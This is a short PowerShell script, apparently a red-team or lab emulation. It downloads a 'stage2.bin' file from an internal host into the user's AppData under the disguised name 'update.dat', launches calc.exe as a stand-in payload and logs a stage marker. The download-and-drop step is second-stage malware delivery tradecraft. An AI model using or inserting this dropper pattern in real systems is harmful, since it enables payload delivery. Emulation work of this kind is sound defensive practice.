[CmdletBinding()]
param(
    [string]$TransferUrl = "http://internal.corp:80/stage2.bin",
    [string]$WorkingPath = "$env:APPDATA\update.dat"
)
(New-Object System.Net.WebClient).DownloadFile($TransferUrl, $WorkingPath)
Start-Process -FilePath 'calc.exe' -ErrorAction SilentlyContinue
Write-Verbose "stage marker 24 reached"
